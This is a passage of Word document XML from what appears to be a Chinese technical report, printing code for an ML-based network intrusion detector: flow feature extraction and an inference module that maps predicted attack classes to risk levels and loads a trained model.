        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for flow in table.expire(rec.ts):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03E25DD3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            out.append((flow.key, flow_features(flow)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A7A3C96">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for flow in table.expire(last_ts + FLOW_TIMEOUT_S + 1):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C95C285">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        out.append((flow.key, flow_features(flow)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7377EFFF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return out</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4953D7C1">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00B59A0A">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-15　center/inference.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（136 行）　M3 在线推理与证据打包</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="773E34E6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""M3 在线推理：把一批流特征变成「类别 + 置信度 + 风险等级」。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F970EE8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="41932057">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>线上只加载一个 best_model.pkl。五个模型是离线对比实验（M8）的产物，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1569E8D0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>不是五个一起推理——上表里其余四个只存在于 comparison.json。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BBF8125">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4635E3EF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>推理契约（由 models/train.py 写入 artifact）：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C5D106D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  model.predict() 返回的是 classes 的下标，不是类名；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1759ACBC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  predict_proba() 的列序是 model.classes_，可能少于全量类别（某个基学习器没见过稀有类）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E647785">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>两条都要在这里兑现，否则会把"决策树"的类别名跟"混合森林"的概率列串到一起，而且不会报错。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34E9B01C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51C3C5DF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="097E2D68">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from __future__ import annotations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="696F80E7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="520A3894">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="185AC31B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from pathlib import Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3743DEBB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="444352D4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import joblib</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C650ADB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import numpy as np</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="060EFE0F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00E54025">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># 类别先验风险：Heartbleed 是信息泄露，顶格；扫描类危害低但必须看得到</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA8EF49">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>BASE_RISK = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7745C326">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "BENIGN": "info",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="307329C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "PortScan": "medium",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="303613DD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Patator": "high",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C04D9A8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "DDoS": "high",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7003F27D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "DoS Hulk": "high",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ABEC979">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Heartbleed": "critical",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="444FE46C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62C7FD77">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>RISK_ORDER = ["info", "low", "medium", "high", "critical"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E2C3DC6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B5CD625">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2CDCD8D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def escalate(risk: str, confidence: float) -&gt; str:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C9003ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """置信度足够高时把风险抬一档；置信度低时如实降一档，别装作很确定。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B01072D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    i = RISK_ORDER.index(risk)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47018E2F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if confidence &gt;= 0.99:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49585023">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        i = min(i + 1, len(RISK_ORDER) - 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7160BEB1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    elif confidence &lt; 0.60:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009635B1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        i = max(i - 1, 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58FB262B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return RISK_ORDER[i]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30EA9B9B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48A78A4F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0FDE9C4B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>class Detector:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D69A0F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __init__(self, model_path: str, schema_path: str | None = None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BFE8055">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        path = Path(model_path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F754A3F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if not path.exists():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F3A16C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            raise SystemExit(f"找不到模型产物 {path}，先跑 models/train.py")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B9464DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        artifact = joblib.load(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79155CEC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.model = artifact["model"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EB2CD6C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.scaler = artifact["scaler"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="005F052C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.feature_names = list(artifact["feature_names"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F29E740">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.classes = [str(c) for c in artifact["classes"]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AC12715">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if artifact.get("predict_returns") != "class_index":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="495403E0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            raise SystemExit(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60A11B83">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                f"{path} 的 predict_returns={artifact.get('predict_returns')!r}，"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40B86BD3">
      <w:pPr>
        <w:widowControl w:val="0"/>
